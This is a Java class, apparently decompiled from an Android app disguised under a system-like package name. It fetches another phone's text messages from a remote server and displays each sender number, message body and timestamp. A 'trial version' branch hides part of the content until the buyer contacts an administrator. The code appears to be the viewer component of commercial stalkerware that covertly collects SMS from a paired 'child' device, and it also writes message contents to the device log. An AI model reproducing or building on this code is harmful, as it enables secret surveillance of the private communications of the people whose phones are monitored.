package com.android.service.view;

import android.content.Context;
import android.util.Log;
import com.android.service.XmppService;
import com.xmpp.client.util.HttpClinentModle;
import com.xmpp.client.util.PushDialogModle;
import java.util.ArrayList;
import java.util.List;
import java.util.StringTokenizer;
import org.jivesoftware.smackx.packet.IBBExtensions.Data;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

public class SMSDataBean {
    private Context ctx;
    private HttpClinentModle hcm = new HttpClinentModle(this.ctx);
    private List<String> list;
    private List<String> list2;
    private List<String> listtime;
    private List<String> listtype;
    private PushDialogModle pdm = new PushDialogModle(this.ctx);
    private String strSelect_Pairnum;
    private String strVersion;

    public SMSDataBean(Context context, String Version, String Select_Pairnum) {
        this.ctx = context;
        this.strVersion = Version;
        this.strSelect_Pairnum = Select_Pairnum;
    }

    public List<String> getlist() {
        return this.list;
    }

    public List<String> getlist2() {
        return this.list2;
    }

    public List<String> getlisttime() {
        return this.listtime;
    }

    public List<String> getlisttype() {
        return this.listtype;
    }

    public void UpdataJason(String strHostname) {
        JsonParser(this.hcm.HttpClinentJason("http://" + strHostname + "/API/GetSMS.ashx?phonenum=" + this.strSelect_Pairnum));
        SMSViewActivity.sms_listViewObj.setAdapter(new SMSAdapter(this.ctx, this.list, this.list2, this.listtime, this.listtype));
    }

    private void JsonParser(String strJason) {
        this.list = new ArrayList();
        this.list2 = new ArrayList();
        this.listtime = new ArrayList();
        this.listtype = new ArrayList();
        try {
            JSONObject json = new JSONObject(strJason);
            if (json.getString("success").equalsIgnoreCase("true")) {
                String strtime = json.getString("AddTime");
                JSONArray nameList = json.getJSONArray(Data.ELEMENT_NAME);
                SMSViewActivity.tv_update_time.setText(strtime);
                if (nameList.length() > 0) {
                    Log.d("Total:", nameList.length());
                    for (int i = 0; i < nameList.length(); i++) {
                        StringTokenizer st2 = new StringTokenizer(nameList.getJSONObject(i).getString("str"), XmppService.strCheckTag);
                        String smssub1 = "";
                        String smssub2 = "";
                        String smssub3 = "";
                        String smssub4 = "";
                        int n = 0;
                        while (st2.hasMoreElements()) {
                            if (n == 0) {
                                smssub4 = st2.nextToken();
                            } else if (n == 1) {
                                smssub1 = st2.nextToken();
                            } else if (n == 2) {
                                smssub2 = st2.nextToken();
                            } else {
                                smssub3 = st2.nextToken();
                            }
                            n++;
                        }
                        if (smssub3 != null && smssub3.length() > 0) {
                            if (this.strVersion.equalsIgnoreCase("1")) {
                                this.list.add("簡訊發送人號碼: " + smssub1);
                                this.list2.add("簡訊內容: " + smssub2);
                                this.listtime.add("發送時間: " + smssub3);
                                this.listtype.add(smssub4);
                                Log.e("sms---->", new StringBuilder(String.valueOf(smssub1)).append("\n").append(smssub2).append("\n").append(smssub3).toString());
                            } else {
                                if (!(smssub1 == null || smssub2 == null || smssub3 == null)) {
                                    if (smssub1.length() > 5) {
                                        smssub1 = smssub1.replace(smssub1.substring(smssub1.length() - 5), "xxxxx");
                                    } else {
                                        smssub1 = smssub1.replace(smssub1, "xxxxx");
                                    }
                                    if (smssub2.length() > 5) {
                                        Log.e("smssub2-->", smssub2);
                                        smssub2 = smssub2.replace(smssub2.substring(5, smssub2.length()), "xxxxxxxxx");
                                    } else {
                                        smssub2 = smssub2.replace(smssub2.substring(1, smssub2.length()), "xxxxx");
                                    }
                                    if (smssub3.length() > 7) {
                                        smssub3 = smssub3.replace(smssub3.substring(7, smssub3.length()), "-xx xx:xx:xx");
                                    } else {
                                        smssub3 = smssub3.replace(smssub3, "xxxxxxx");
                                    }
                                }
                                this.list.add("簡訊發送人號碼: " + smssub1);
                                this.list2.add("簡訊內容: " + smssub2 + "\n\n試用版將提供部分內容，如需觀看全部內容請與管理人員聯絡");
                                this.listtime.add("發送時間" + smssub3);
                                this.listtype.add(smssub4);
                            }
                        }
                    }
                    return;
                }
                this.pdm.PushAlertSingleButton("訊息通知", "子機目前無簡訊資料!!");
                return;
            }
            this.pdm.PushAlertSingleButton("伺服器訊息", json.getString("reason"));
        } catch (JSONException e) {
            this.pdm.PushAlertSingleButton("系統出錯", new StringBuilder(String.valueOf(strJason)).append(this.strSelect_Pairnum).append(":").append(Log.getStackTraceString(e)).toString());
        } catch (Exception e2) {
            this.pdm.PushAlertSingleButton("系統出錯", new StringBuilder(String.valueOf(strJason)).append(this.strSelect_Pairnum).append(":").append(Log.getStackTraceString(e2)).toString());
        }
    }
}
